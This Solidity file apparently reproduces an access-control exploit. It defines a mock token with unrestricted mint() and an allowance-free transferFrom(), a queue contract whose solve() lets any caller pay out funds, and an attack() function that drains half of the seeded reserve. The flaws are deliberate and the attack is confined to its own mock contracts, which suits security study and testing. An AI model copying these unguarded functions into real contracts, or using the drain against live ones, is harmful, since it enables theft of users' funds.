// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

contract LiquidETH { mapping(address=>uint256) public balanceOf; string public constant name="LiquidETH"; string public constant symbol="LiquidETH"; uint8 public constant decimals=18; function mint(address to,uint256 a) external{balanceOf[to]+=a;} function transfer(address to,uint256 a) external returns(bool){require(balanceOf[msg.sender]>=a,"balance");balanceOf[msg.sender]-=a;balanceOf[to]+=a;return true;} function transferFrom(address f,address t,uint256 a) external returns(bool){require(balanceOf[f]>=a,"balance");balanceOf[f]-=a;balanceOf[t]+=a;return true;} }

contract AtomicQueue { LiquidETH public immutable asset; constructor(LiquidETH a){asset=a;} function solve(address solver,uint256 amount,address receiver) external { asset.transfer(receiver,amount); } }

contract Scenario { LiquidETH public asset; AtomicQueue public queue; address public immutable owner; uint256 public constant SEED=1_000_000 ether; constructor(){owner=msg.sender;asset=new LiquidETH();queue=new AtomicQueue(asset);asset.mint(address(queue),SEED);} function attack(address receiver) external {require(msg.sender==owner,"unauthorized");queue.solve(address(queue),SEED/2,receiver);} function reserveBalance() external view returns(uint256){return asset.balanceOf(address(queue));} function attackerBalance(address a) external view returns(uint256){return asset.balanceOf(a);} function assetAddress() external view returns(address){return address(asset);} }
